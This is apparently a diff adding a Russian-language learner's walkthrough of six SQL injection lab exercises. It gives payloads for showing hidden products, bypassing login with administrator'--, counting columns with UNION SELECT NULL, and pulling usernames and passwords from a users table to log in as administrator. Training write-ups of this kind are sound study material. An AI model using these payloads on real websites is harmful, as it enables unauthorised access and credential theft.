@@ -1,0 +1,30 @@
+"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
+1.1. Выбираем какой-либо товар
+1.2. В строке для urla дописываем в параметр категория '+OR+1=1--
+1.3. Нажимаем enter и получаем список выпущенных и невыпущенных товаров для любой категории
+"SQL injection vulnerability allowing login bypass"
+2.1. Открываем форму для логина и пароля
+2.2. В логине пишем "administrator'--", а пароль-любой набор символов
+"SQL injection UNION attack, determining the number of columns returned by the query"
+3.1. Выбираем какой-либо товар
+3.2. В параметр "категория" дописываем '+UNION+SELECT+NULL--
+3.3. Нажимаем enter, если появляется ошибка, то дописываем еще один NULL: '+UNION+SELECT+NULL,NULL--
+3.4. Делаем так, пока ошибка не исчезнет
+"SQL injection UNION attack, finding a column containing text"
+4.1. Выбираем какой-либо товар
+4.2. В параметр "категория" дописываем '+UNION+SELECT+NULL,NULL,NULL--
+4.3. Далее вместо одного из NULL, пишем любой набор букв:
+'+UNION+SELECT+'a',NULL,NULL--
+4.4. Если есть ошибка, меняем следующий NULL
+4.5. Мне надо было заменить на втором NULL
+4.6. Как только определили, какой надо заменить NULL, там генерится строка, и вместо рандомного набора букв(нашего из пункта 3), вставляем эту строчку
+"SQL injection UNION attack, retrieving data from other tables"
+5.1. В параметр "категория" дописываем '+UNION+SELECT+'a','b'--
+5.2. Если нет ошибки, то там же переписываем '+UNION+SELECT+username,+password+FROM+users--
+5.3. Получаем список логинов и паролей
+5.4. И заходим как администратор
+"SQL injection UNION attack, retrieving multiple values in a single column"
+6.1. В параметр "категория" дописываем '+UNION+SELECT+NULL,'A'--, убеждаемся, что не выдает ошибки
+6.2. Далее в этом же параметре пишем:
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+6.3. Получаем список логинов и паролей и заходим как администратор
